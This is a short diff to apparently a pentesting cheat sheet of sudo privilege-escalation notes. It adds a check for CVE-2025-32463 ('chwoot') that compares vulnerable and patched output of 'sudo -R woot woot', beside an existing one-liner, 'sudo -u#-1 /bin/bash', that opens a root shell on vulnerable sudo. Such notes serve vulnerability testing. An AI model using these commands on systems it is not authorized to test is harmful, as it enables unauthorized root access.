@@ -14,5 +14,16 @@ From @sickrov
 
 sudo -u#-1 /bin/bash
 
+## CVE-2025-32463_chwoot)
+
+### Vulnerable sudo
+pwn ~ $ sudo -R woot woot
+sudo: woot: No such file or directory
+
+### Patched sudo
+pwn ~ $ sudo -R woot woot
+[sudo] password for pwn:
+sudo: you are not permitted to use the -R option with woot
+
 
 
